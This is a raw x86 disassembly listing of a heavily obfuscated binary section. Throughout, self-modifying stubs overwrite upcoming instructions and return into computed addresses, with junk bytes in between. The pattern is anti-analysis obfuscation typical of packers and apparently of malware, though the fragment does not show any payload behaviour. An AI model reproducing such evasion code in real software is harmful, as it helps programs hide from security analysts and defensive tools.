  407b99:	64 f7 d9             	fs neg %ecx
  407b9c:	12 ff                	adc    %bh,%bh
  407b9e:	50                   	push   %eax
  407b9f:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407ba3:	66 87 05 99 7b 40 00 	xchg   %ax,0x407b99
  407baa:	b8 4d 41 a7 61       	mov    $0x61a7414d,%eax
  407baf:	87 04 24             	xchg   %eax,(%esp)
  407bb2:	c3                   	ret
  407bb3:	8f 05 e1 7b 40 00    	pop    0x407be1
  407bb9:	50                   	push   %eax
  407bba:	90                   	nop
  407bbb:	b8 15 20 40 00       	mov    $0x402015,%eax
  407bc0:	8d 80 d3 cc 7b ff    	lea    -0x84332d(%eax),%eax
  407bc6:	87 05 cf 7b 40 00    	xchg   %eax,0x407bcf
  407bcc:	58                   	pop    %eax
  407bcd:	f3 90                	pause
  407bcf:	c8 b7 59 d3          	enter  $0x59b7,$0xd3
  407bd3:	ff 50 66             	call   *0x66(%eax)
  407bd6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407bdb:	05 cf 7b 40 00       	add    $0x407bcf,%eax
  407be0:	b8 79 22 56 df       	mov    $0xdf562279,%eax
  407be5:	87 04 24             	xchg   %eax,(%esp)
  407be8:	c3                   	ret
  407be9:	8f 05 19 7c 40 00    	pop    0x407c19
  407bef:	50                   	push   %eax
  407bf0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407bf6:	8d 80 b2 25 bc 00    	lea    0xbc25b2(%eax),%eax
  407bfc:	87 05 05 7c 40 00    	xchg   %eax,0x407c05
  407c02:	58                   	pop    %eax
  407c03:	f3 90                	pause
  407c05:	34 dc                	xor    $0xdc,%al
  407c07:	2c 17                	sub    $0x17,%al
  407c09:	00 00                	add    %al,(%eax)
  407c0b:	00 50 66             	add    %dl,0x66(%eax)
  407c0e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407c13:	05 05 7c 40 00       	add    $0x407c05,%eax
  407c18:	b8 75 bb 65 a0       	mov    $0xa065bb75,%eax
  407c1d:	8d 40 02             	lea    0x2(%eax),%eax
  407c20:	87 04 24             	xchg   %eax,(%esp)
  407c23:	c3                   	ret
  407c24:	8f 05 52 7c 40 00    	pop    0x407c52
  407c2a:	50                   	push   %eax
  407c2b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407c31:	8d 80 8c 80 17 40    	lea    0x4017808c(%eax),%eax
  407c37:	87 05 40 7c 40 00    	xchg   %eax,0x407c40
  407c3d:	58                   	pop    %eax
  407c3e:	f3 90                	pause
  407c40:	64 e4 0a             	fs in  $0xa,%al
  407c43:	56                   	push   %esi
  407c44:	00 50 66             	add    %dl,0x66(%eax)
  407c47:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407c4c:	05 40 7c 40 00       	add    $0x407c40,%eax
  407c51:	b8 22 6d e5 23       	mov    $0x23e56d22,%eax
  407c56:	87 04 24             	xchg   %eax,(%esp)
  407c59:	c3                   	ret
  407c5a:	8f 05 89 7c 40 00    	pop    0x407c89
  407c60:	50                   	push   %eax
  407c61:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407c67:	8d 80 ea f5 07 52    	lea    0x5207f5ea(%eax),%eax
  407c6d:	87 05 76 7c 40 00    	xchg   %eax,0x407c76
  407c73:	58                   	pop    %eax
  407c74:	f3 90                	pause
  407c76:	c6                   	(bad)
  407c77:	0e                   	push   %cs
  407c78:	1c f1                	sbb    $0xf1,%al
  407c7a:	40                   	inc    %eax
  407c7b:	00 50 66             	add    %dl,0x66(%eax)
  407c7e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407c83:	05 76 7c 40 00       	add    $0x407c76,%eax
  407c88:	b8 27 c5 2a eb       	mov    $0xeb2ac527,%eax
  407c8d:	8d 40 01             	lea    0x1(%eax),%eax
  407c90:	87 04 24             	xchg   %eax,(%esp)
  407c93:	c3                   	ret
  407c94:	8f 05 c3 7c 40 00    	pop    0x407cc3
  407c9a:	50                   	push   %eax
  407c9b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407ca1:	8d 80 b2 e1 bf ff    	lea    -0x401e4e(%eax),%eax
  407ca7:	87 05 b0 7c 40 00    	xchg   %eax,0x407cb0
  407cad:	58                   	pop    %eax
  407cae:	f3 90                	pause
  407cb0:	56                   	push   %esi
  407cb1:	39 41 05             	cmp    %eax,0x5(%ecx)
  407cb4:	00 00                	add    %al,(%eax)
  407cb6:	50                   	push   %eax
  407cb7:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407cbb:	66 87 05 b0 7c 40 00 	xchg   %ax,0x407cb0
  407cc2:	b8 6d a4 ab 85       	mov    $0x85aba46d,%eax
  407cc7:	8d 40 01             	lea    0x1(%eax),%eax
  407cca:	87 04 24             	xchg   %eax,(%esp)
  407ccd:	c3                   	ret
  407cce:	8f 05 fc 7c 40 00    	pop    0x407cfc
  407cd4:	50                   	push   %eax
  407cd5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407cdb:	8d 80 d3 6b 7c ff    	lea    -0x83942d(%eax),%eax
  407ce1:	87 05 ea 7c 40 00    	xchg   %eax,0x407cea
  407ce7:	58                   	pop    %eax
  407ce8:	f3 90                	pause
  407cea:	44                   	inc    %esp
  407ceb:	17                   	pop    %ss
  407cec:	15 e4 ff 50 66       	adc    $0x6650ffe4,%eax
  407cf1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407cf6:	05 ea 7c 40 00       	add    $0x407cea,%eax
  407cfb:	b8 0b b4 2c 9a       	mov    $0x9a2cb40b,%eax
  407d00:	87 04 24             	xchg   %eax,(%esp)
  407d03:	c3                   	ret
  407d04:	8f 05 33 7d 40 00    	pop    0x407d33
  407d0a:	50                   	push   %eax
  407d0b:	90                   	nop
  407d0c:	b8 15 20 40 00       	mov    $0x402015,%eax
  407d11:	8d 80 ea 05 d8 51    	lea    0x51d805ea(%eax),%eax
  407d17:	87 05 20 7d 40 00    	xchg   %eax,0x407d20
  407d1d:	58                   	pop    %eax
  407d1e:	f3 90                	pause
  407d20:	a8 93                	test   $0x93,%al
  407d22:	82 92 40 00 50 66 b8 	adcb   $0xb8,0x66500040(%edx)
  407d29:	eb e8                	jmp    0x407d13
  407d2b:	66 87 05 20 7d 40 00 	xchg   %ax,0x407d20
  407d32:	b8 61 a2 5e a1       	mov    $0xa15ea261,%eax
  407d37:	8d 40 01             	lea    0x1(%eax),%eax
  407d3a:	87 04 24             	xchg   %eax,(%esp)
  407d3d:	c3                   	ret
  407d3e:	8f 05 6d 7d 40 00    	pop    0x407d6d
  407d44:	50                   	push   %eax
  407d45:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407d4b:	8d 80 76 f5 5f 57    	lea    0x575ff576(%eax),%eax
  407d51:	87 05 5a 7d 40 00    	xchg   %eax,0x407d5a
  407d57:	58                   	pop    %eax
  407d58:	f3 90                	pause
  407d5a:	f5                   	cmc
  407d5b:	c7                   	(bad)
  407d5c:	7c 0a                	jl     0x407d68
  407d5e:	40                   	inc    %eax
  407d5f:	00 50 66             	add    %dl,0x66(%eax)
  407d62:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407d67:	05 5a 7d 40 00       	add    $0x407d5a,%eax
  407d6c:	b8 d4 a2 4b 42       	mov    $0x424ba2d4,%eax
  407d71:	8d 40 01             	lea    0x1(%eax),%eax
  407d74:	87 04 24             	xchg   %eax,(%esp)
  407d77:	c3                   	ret
  407d78:	8f 05 a7 7d 40 00    	pop    0x407da7
  407d7e:	50                   	push   %eax
  407d7f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407d85:	8d 80 ea f5 6f 52    	lea    0x526ff5ea(%eax),%eax
  407d8b:	87 05 94 7d 40 00    	xchg   %eax,0x407d94
  407d91:	58                   	pop    %eax
  407d92:	f3 90                	pause
  407d94:	27                   	daa
  407d95:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407d96:	3c b2                	cmp    $0xb2,%al
  407d98:	40                   	inc    %eax
  407d99:	00 50 66             	add    %dl,0x66(%eax)
  407d9c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407da1:	05 94 7d 40 00       	add    $0x407d94,%eax
  407da6:	b8 eb 45 56 31       	mov    $0x315645eb,%eax
  407dab:	8d 40 01             	lea    0x1(%eax),%eax
  407dae:	87 04 24             	xchg   %eax,(%esp)
  407db1:	c3                   	ret
  407db2:	8f 05 e0 7d 40 00    	pop    0x407de0
  407db8:	50                   	push   %eax
  407db9:	90                   	nop
  407dba:	b8 15 20 40 00       	mov    $0x402015,%eax
  407dbf:	8d 80 d3 1d 7b ff    	lea    -0x84e22d(%eax),%eax
  407dc5:	87 05 ce 7d 40 00    	xchg   %eax,0x407dce
  407dcb:	58                   	pop    %eax
  407dcc:	f3 90                	pause
  407dce:	99                   	cltd
  407dcf:	bf 8b 24 ff 50       	mov    $0x50ff248b,%edi
  407dd4:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407dd8:	66 87 05 ce 7d 40 00 	xchg   %ax,0x407dce
  407ddf:	b8 77 37 ad d9       	mov    $0xd9ad3777,%eax
  407de4:	87 04 24             	xchg   %eax,(%esp)
  407de7:	c3                   	ret
  407de8:	8f 05 16 7e 40 00    	pop    0x407e16
  407dee:	50                   	push   %eax
  407def:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407df5:	8d 80 8c 80 17 40    	lea    0x4017808c(%eax),%eax
  407dfb:	87 05 04 7e 40 00    	xchg   %eax,0x407e04
  407e01:	58                   	pop    %eax
  407e02:	f3 90                	pause
  407e04:	4b                   	dec    %ebx
  407e05:	ce                   	into
  407e06:	b3 6d                	mov    $0x6d,%bl
  407e08:	00 50 66             	add    %dl,0x66(%eax)
  407e0b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407e10:	05 04 7e 40 00       	add    $0x407e04,%eax
  407e15:	b8 e6 17 46 21       	mov    $0x214617e6,%eax
  407e1a:	87 04 24             	xchg   %eax,(%esp)
  407e1d:	c3                   	ret
  407e1e:	8f 05 4d 7e 40 00    	pop    0x407e4d
  407e24:	50                   	push   %eax
  407e25:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407e2b:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  407e31:	87 05 3a 7e 40 00    	xchg   %eax,0x407e3a
  407e37:	58                   	pop    %eax
  407e38:	f3 90                	pause
  407e3a:	1d 6a 27 b4 40       	sbb    $0x40b4276a,%eax
  407e3f:	00 50 66             	add    %dl,0x66(%eax)
  407e42:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407e47:	05 3a 7e 40 00       	add    $0x407e3a,%eax
  407e4c:	b8 f0 81 f2 e7       	mov    $0xe7f281f0,%eax
  407e51:	8d 40 01             	lea    0x1(%eax),%eax
  407e54:	87 04 24             	xchg   %eax,(%esp)
  407e57:	c3                   	ret
  407e58:	8f 05 87 7e 40 00    	pop    0x407e87
  407e5e:	50                   	push   %eax
  407e5f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407e65:	8d 80 ea 15 84 56    	lea    0x568415ea(%eax),%eax
  407e6b:	87 05 74 7e 40 00    	xchg   %eax,0x407e74
  407e71:	58                   	pop    %eax
  407e72:	f3 90                	pause
  407e74:	1f                   	pop    %ds
  407e75:	f6 fe                	idiv   %dh
  407e77:	2e 40                	cs inc %eax
  407e79:	00 50 66             	add    %dl,0x66(%eax)
  407e7c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407e81:	05 74 7e 40 00       	add    $0x407e74,%eax
  407e86:	b8 f7 d9 cf 0d       	mov    $0xdcfd9f7,%eax
  407e8b:	8d 40 01             	lea    0x1(%eax),%eax
  407e8e:	87 04 24             	xchg   %eax,(%esp)
  407e91:	c3                   	ret
  407e92:	8f 05 c0 7e 40 00    	pop    0x407ec0
  407e98:	50                   	push   %eax
  407e99:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407e9f:	8d 80 d3 3e 71 ff    	lea    -0x8ec12d(%eax),%eax
  407ea5:	87 05 ae 7e 40 00    	xchg   %eax,0x407eae
  407eab:	58                   	pop    %eax
  407eac:	f3 90                	pause
  407eae:	06                   	push   %es
  407eaf:	19 7c ac ff          	sbb    %edi,-0x1(%esp,%ebp,4)
  407eb3:	50                   	push   %eax
  407eb4:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407eb8:	66 87 05 ae 7e 40 00 	xchg   %ax,0x407eae
  407ebf:	b8 17 05 19 75       	mov    $0x75190517,%eax
  407ec4:	87 04 24             	xchg   %eax,(%esp)
  407ec7:	c3                   	ret
  407ec8:	8f 05 f7 7e 40 00    	pop    0x407ef7
  407ece:	50                   	push   %eax
  407ecf:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407ed5:	8d 80 6c cc 08 02    	lea    0x208cc6c(%eax),%eax
  407edb:	87 05 e4 7e 40 00    	xchg   %eax,0x407ee4
  407ee1:	58                   	pop    %eax
  407ee2:	f3 90                	pause
  407ee4:	7b c0                	jnp    0x407ea6
  407ee6:	00 07                	add    %al,(%edi)
  407ee8:	00 00                	add    %al,(%eax)
  407eea:	50                   	push   %eax
  407eeb:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407eef:	66 87 05 e4 7e 40 00 	xchg   %ax,0x407ee4
  407ef6:	b8 7d fc 49 f2       	mov    $0xf249fc7d,%eax
  407efb:	8d 40 01             	lea    0x1(%eax),%eax
  407efe:	87 04 24             	xchg   %eax,(%esp)
  407f01:	c3                   	ret
  407f02:	8f 05 31 7f 40 00    	pop    0x407f31
  407f08:	50                   	push   %eax
  407f09:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407f0f:	8d 80 fa 63 be b1    	lea    -0x4e419c06(%eax),%eax
  407f15:	87 05 1e 7f 40 00    	xchg   %eax,0x407f1e
  407f1b:	58                   	pop    %eax
  407f1c:	f3 90                	pause
  407f1e:	89 29                	mov    %ebp,(%ecx)
  407f20:	81 fd ff ff 50 66    	cmp    $0x6650ffff,%ebp
  407f26:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407f2b:	05 1e 7f 40 00       	add    $0x407f1e,%eax
  407f30:	b8 4f fa 63 1c       	mov    $0x1c63fa4f,%eax
  407f35:	8d 40 01             	lea    0x1(%eax),%eax
  407f38:	87 04 24             	xchg   %eax,(%esp)
  407f3b:	c3                   	ret
  407f3c:	8f 05 6b 7f 40 00    	pop    0x407f6b
  407f42:	50                   	push   %eax
  407f43:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407f49:	8d 80 fa 63 84 b1    	lea    -0x4e7b9c06(%eax),%eax
  407f4f:	87 05 58 7f 40 00    	xchg   %eax,0x407f58
  407f55:	58                   	pop    %eax
  407f56:	f3 90                	pause
  407f58:	34 60                	xor    $0x60,%al
  407f5a:	a9 d3 ff ff 50       	test   $0x50ffffd3,%eax
  407f5f:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407f63:	66 87 05 58 7f 40 00 	xchg   %ax,0x407f58
  407f6a:	b8 c7 a0 b7 fe       	mov    $0xfeb7a0c7,%eax
  407f6f:	8d 40 01             	lea    0x1(%eax),%eax
  407f72:	87 04 24             	xchg   %eax,(%esp)
  407f75:	c3                   	ret
  407f76:	8f 05 a4 7f 40 00    	pop    0x407fa4
  407f7c:	50                   	push   %eax
  407f7d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407f83:	8d 80 53 e4 c0 ff    	lea    -0x3f1bad(%eax),%eax
  407f89:	87 05 92 7f 40 00    	xchg   %eax,0x407f92
  407f8f:	58                   	pop    %eax
  407f90:	f3 90                	pause
  407f92:	84 fd                	test   %bh,%ch
  407f94:	56                   	push   %esi
  407f95:	b2 00                	mov    $0x0,%dl
  407f97:	50                   	push   %eax
  407f98:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407f9c:	66 87 05 92 7f 40 00 	xchg   %ax,0x407f92
  407fa3:	b8 4e 67 80 b6       	mov    $0xb680674e,%eax
  407fa8:	87 04 24             	xchg   %eax,(%esp)
  407fab:	c3                   	ret
  407fac:	8f 05 db 7f 40 00    	pop    0x407fdb
  407fb2:	50                   	push   %eax
  407fb3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407fb9:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  407fbf:	87 05 c8 7f 40 00    	xchg   %eax,0x407fc8
  407fc5:	58                   	pop    %eax
  407fc6:	f3 90                	pause
  407fc8:	1c bc                	sbb    $0xbc,%al
  407fca:	ff                   	(bad)
  407fcb:	7e ff                	jle    0x407fcc
  407fcd:	ff 50 66             	call   *0x66(%eax)
  407fd0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407fd5:	05 c8 7f 40 00       	add    $0x407fc8,%eax
  407fda:	b8 58 66 a9 49       	mov    $0x49a96658,%eax
  407fdf:	8d 40 01             	lea    0x1(%eax),%eax
  407fe2:	87 04 24             	xchg   %eax,(%esp)
  407fe5:	c3                   	ret
  407fe6:	8f 05 14 80 40 00    	pop    0x408014
  407fec:	50                   	push   %eax
  407fed:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407ff3:	8d 80 d3 65 79 ff    	lea    -0x869a2d(%eax),%eax
  407ff9:	87 05 02 80 40 00    	xchg   %eax,0x408002
  407fff:	58                   	pop    %eax
  408000:	f3 90                	pause
  408002:	49                   	dec    %ecx
  408003:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408004:	2c b7                	sub    $0xb7,%al
  408006:	ff 50 66             	call   *0x66(%eax)
  408009:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40800e:	05 02 80 40 00       	add    $0x408002,%eax
  408013:	b8 38 7b 76 2c       	mov    $0x2c767b38,%eax
  408018:	87 04 24             	xchg   %eax,(%esp)
  40801b:	c3                   	ret
  40801c:	8f 05 4b 80 40 00    	pop    0x40804b
  408022:	50                   	push   %eax
  408023:	90                   	nop
  408024:	b8 15 20 40 00       	mov    $0x402015,%eax
  408029:	8d 80 ea 05 e4 51    	lea    0x51e405ea(%eax),%eax
  40802f:	87 05 38 80 40 00    	xchg   %eax,0x408038
  408035:	58                   	pop    %eax
  408036:	f3 90                	pause
  408038:	e3 8e                	jecxz  0x407fc8
  40803a:	9b                   	fwait
  40803b:	f9                   	stc
  40803c:	40                   	inc    %eax
  40803d:	00 50 66             	add    %dl,0x66(%eax)
  408040:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408045:	05 38 80 40 00       	add    $0x408038,%eax
  40804a:	b8 6f a0 00 bc       	mov    $0xbc00a06f,%eax
  40804f:	8d 40 01             	lea    0x1(%eax),%eax
  408052:	87 04 24             	xchg   %eax,(%esp)
  408055:	c3                   	ret
  408056:	8f 05 85 80 40 00    	pop    0x408085
  40805c:	50                   	push   %eax
  40805d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408063:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  408069:	87 05 72 80 40 00    	xchg   %eax,0x408072
  40806f:	58                   	pop    %eax
  408070:	f3 90                	pause
  408072:	f8                   	clc
  408073:	e4 05                	in     $0x5,%al
  408075:	e5 ff                	in     $0xff,%eax
  408077:	ff 50 66             	call   *0x66(%eax)
  40807a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40807f:	05 72 80 40 00       	add    $0x408072,%eax
  408084:	b8 5d 8f 3f 4d       	mov    $0x4d3f8f5d,%eax
  408089:	8d 40 01             	lea    0x1(%eax),%eax
  40808c:	87 04 24             	xchg   %eax,(%esp)
  40808f:	c3                   	ret
  408090:	8f 05 be 80 40 00    	pop    0x4080be
  408096:	50                   	push   %eax
  408097:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40809d:	8d 80 d3 a9 78 ff    	lea    -0x87562d(%eax),%eax
  4080a3:	87 05 ac 80 40 00    	xchg   %eax,0x4080ac
  4080a9:	58                   	pop    %eax
  4080aa:	f3 90                	pause
  4080ac:	f6 8c 99 39 ff 50 66 	testb  $0xb8,0x6650ff39(%ecx,%ebx,4)
  4080b3:	b8 
  4080b4:	eb e8                	jmp    0x40809e
  4080b6:	66 87 05 ac 80 40 00 	xchg   %ax,0x4080ac
  4080bd:	b8 83 24 d3 41       	mov    $0x41d32483,%eax
  4080c2:	87 04 24             	xchg   %eax,(%esp)
  4080c5:	c3                   	ret
  4080c6:	8f 05 f6 80 40 00    	pop    0x4080f6
  4080cc:	50                   	push   %eax
  4080cd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4080d3:	8d 80 78 6c c5 f6    	lea    -0x93a9388(%eax),%eax
  4080d9:	87 05 e2 80 40 00    	xchg   %eax,0x4080e2
  4080df:	58                   	pop    %eax
  4080e0:	f3 90                	pause
  4080e2:	5c                   	pop    %esp
  4080e3:	18 ab 0b fe ff ff    	sbb    %ch,-0x1f5(%ebx)
  4080e9:	50                   	push   %eax
  4080ea:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4080ee:	66 87 05 e2 80 40 00 	xchg   %ax,0x4080e2
  4080f5:	b8 13 98 ff 56       	mov    $0x56ff9813,%eax
  4080fa:	8d 40 02             	lea    0x2(%eax),%eax
  4080fd:	87 04 24             	xchg   %eax,(%esp)
  408100:	c3                   	ret
  408101:	8f 05 31 81 40 00    	pop    0x408131
  408107:	50                   	push   %eax
  408108:	90                   	nop
  408109:	b8 15 20 40 00       	mov    $0x402015,%eax
  40810e:	8d 80 6b 9d b9 fe    	lea    -0x1466295(%eax),%eax
  408114:	87 05 1d 81 40 00    	xchg   %eax,0x40811d
  40811a:	58                   	pop    %eax
  40811b:	f3 90                	pause
  40811d:	1a 4f 00             	sbb    0x0(%edi),%cl
  408120:	2e ff                	cs (bad)
  408122:	ff                   	(bad)
  408123:	3a 50 66             	cmp    0x66(%eax),%dl
  408126:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40812b:	05 1d 81 40 00       	add    $0x40811d,%eax
  408130:	b8 e7 2f 4f 37       	mov    $0x374f2fe7,%eax
  408135:	8d 40 02             	lea    0x2(%eax),%eax
  408138:	87 04 24             	xchg   %eax,(%esp)
  40813b:	c3                   	ret
  40813c:	8f 05 6b 81 40 00    	pop    0x40816b
  408142:	50                   	push   %eax
  408143:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408149:	8d 80 78 65 78 fd    	lea    -0x2879a88(%eax),%eax
  40814f:	87 05 58 81 40 00    	xchg   %eax,0x408158
  408155:	58                   	pop    %eax
  408156:	f3 90                	pause
  408158:	68 ba 45 4d ff       	push   $0xff4d45ba
  40815d:	ff 50 66             	call   *0x66(%eax)
  408160:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408165:	05 58 81 40 00       	add    $0x408158,%eax
  40816a:	b8 30 fa 7f 77       	mov    $0x777ffa30,%eax
  40816f:	8d 40 01             	lea    0x1(%eax),%eax
  408172:	87 04 24             	xchg   %eax,(%esp)
  408175:	c3                   	ret
  408176:	8f 05 a5 81 40 00    	pop    0x4081a5
  40817c:	50                   	push   %eax
  40817d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408183:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  408189:	87 05 92 81 40 00    	xchg   %eax,0x408192
  40818f:	58                   	pop    %eax
  408190:	f3 90                	pause
  408192:	70 d6                	jo     0x40816a
  408194:	03 d1                	add    %ecx,%edx
  408196:	ff                   	(bad)
  408197:	ff 50 66             	call   *0x66(%eax)
  40819a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40819f:	05 92 81 40 00       	add    $0x408192,%eax
  4081a4:	b8 d7 68 ba 25       	mov    $0x25ba68d7,%eax
  4081a9:	8d 40 01             	lea    0x1(%eax),%eax
  4081ac:	87 04 24             	xchg   %eax,(%esp)
  4081af:	c3                   	ret
  4081b0:	8f 05 df 81 40 00    	pop    0x4081df
  4081b6:	50                   	push   %eax
  4081b7:	90                   	nop
  4081b8:	b8 15 20 40 00       	mov    $0x402015,%eax
  4081bd:	8d 80 ea f5 53 52    	lea    0x5253f5ea(%eax),%eax
  4081c3:	87 05 cc 81 40 00    	xchg   %eax,0x4081cc
  4081c9:	58                   	pop    %eax
  4081ca:	f3 90                	pause
  4081cc:	79 b7                	jns    0x408185
  4081ce:	63 dc                	arpl   %ebx,%esp
  4081d0:	40                   	inc    %eax
  4081d1:	00 50 66             	add    %dl,0x66(%eax)
  4081d4:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4081d9:	05 cc 81 40 00       	add    $0x4081cc,%eax
  4081de:	b8 32 4f 0f 37       	mov    $0x370f4f32,%eax
  4081e3:	8d 40 01             	lea    0x1(%eax),%eax
  4081e6:	87 04 24             	xchg   %eax,(%esp)
  4081e9:	c3                   	ret
  4081ea:	8f 05 1a 82 40 00    	pop    0x40821a
  4081f0:	50                   	push   %eax
  4081f1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4081f7:	8d 80 6b 9d b8 fe    	lea    -0x1476295(%eax),%eax
  4081fd:	87 05 06 82 40 00    	xchg   %eax,0x408206
  408203:	58                   	pop    %eax
  408204:	f3 90                	pause
  408206:	9b                   	fwait
  408207:	f7 f9                	idiv   %ecx
  408209:	1d ff ff 5c 50       	sbb    $0x505cffff,%eax
  40820e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408212:	66 87 05 06 82 40 00 	xchg   %ax,0x408206
  408219:	b8 e3 78 2c 29       	mov    $0x292c78e3,%eax
  40821e:	8d 40 02             	lea    0x2(%eax),%eax
  408221:	87 04 24             	xchg   %eax,(%esp)
  408224:	c3                   	ret
  408225:	8f 05 55 82 40 00    	pop    0x408255
  40822b:	50                   	push   %eax
  40822c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408232:	8d 80 6b 9d b9 fe    	lea    -0x1466295(%eax),%eax
  408238:	87 05 41 82 40 00    	xchg   %eax,0x408241
  40823e:	58                   	pop    %eax
  40823f:	f3 90                	pause
  408241:	ef                   	out    %eax,(%dx)
  408242:	7a c4                	jp     0x408208
  408244:	53                   	push   %ebx
  408245:	ff                   	(bad)
  408246:	ff 5c 50 66          	lcall  *0x66(%eax,%edx,2)
  40824a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40824f:	05 41 82 40 00       	add    $0x408241,%eax
  408254:	b8 31 b4 d4 ab       	mov    $0xabd4b431,%eax
  408259:	8d 40 02             	lea    0x2(%eax),%eax
  40825c:	87 04 24             	xchg   %eax,(%esp)
  40825f:	c3                   	ret
  408260:	8f 05 8f 82 40 00    	pop    0x40828f
  408266:	50                   	push   %eax
  408267:	90                   	nop
  408268:	b8 15 20 40 00       	mov    $0x402015,%eax
  40826d:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  408273:	87 05 7c 82 40 00    	xchg   %eax,0x40827c
  408279:	58                   	pop    %eax
  40827a:	f3 90                	pause
  40827c:	78 6b                	js     0x4082e9
  40827e:	70 75                	jo     0x4082f5
  408280:	ff                   	(bad)
  408281:	ff 50 66             	call   *0x66(%eax)
  408284:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408289:	05 7c 82 40 00       	add    $0x40827c,%eax
  40828e:	b8 b7 31 57 d5       	mov    $0xd55731b7,%eax
  408293:	8d 40 01             	lea    0x1(%eax),%eax
  408296:	87 04 24             	xchg   %eax,(%esp)
  408299:	c3                   	ret
  40829a:	8f 05 c9 82 40 00    	pop    0x4082c9
  4082a0:	50                   	push   %eax
  4082a1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4082a7:	8d 80 ea f5 5b 52    	lea    0x525bf5ea(%eax),%eax
  4082ad:	87 05 b6 82 40 00    	xchg   %eax,0x4082b6
  4082b3:	58                   	pop    %eax
  4082b4:	f3 90                	pause
  4082b6:	1c 95                	sbb    $0x95,%al
  4082b8:	d9 f6                	fdecstp
  4082ba:	40                   	inc    %eax
  4082bb:	00 50 66             	add    %dl,0x66(%eax)
  4082be:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4082c3:	05 b6 82 40 00       	add    $0x4082b6,%eax
  4082c8:	b8 3c 0c af 7d       	mov    $0x7daf0c3c,%eax
  4082cd:	8d 40 01             	lea    0x1(%eax),%eax
  4082d0:	87 04 24             	xchg   %eax,(%esp)
  4082d3:	c3                   	ret
  4082d4:	8f 05 04 83 40 00    	pop    0x408304
  4082da:	50                   	push   %eax
  4082db:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4082e1:	8d 80 e1 65 78 fd    	lea    -0x2879a1f(%eax),%eax
  4082e7:	87 05 f0 82 40 00    	xchg   %eax,0x4082f0
  4082ed:	58                   	pop    %eax
  4082ee:	f3 90                	pause
  4082f0:	ed                   	in     (%dx),%eax
  4082f1:	ee                   	out    %al,(%dx)
  4082f2:	3c 12                	cmp    $0x12,%al
  4082f4:	ff                   	(bad)
  4082f5:	ff 10                	call   *(%eax)
  4082f7:	50                   	push   %eax
  4082f8:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4082fc:	66 87 05 f0 82 40 00 	xchg   %ax,0x4082f0
  408303:	b8 49 c5 b7 5c       	mov    $0x5cb7c549,%eax
  408308:	8d 40 02             	lea    0x2(%eax),%eax
  40830b:	87 04 24             	xchg   %eax,(%esp)
  40830e:	c3                   	ret
  40830f:	8f 05 3e 83 40 00    	pop    0x40833e
  408315:	50                   	push   %eax
  408316:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40831c:	8d 80 76 6d 98 fd    	lea    -0x267928a(%eax),%eax
  408322:	87 05 2b 83 40 00    	xchg   %eax,0x40832b
  408328:	58                   	pop    %eax
  408329:	f3 90                	pause
  40832b:	0a 39                	or     (%ecx),%bh
  40832d:	06                   	push   %es
  40832e:	03 ff                	add    %edi,%edi
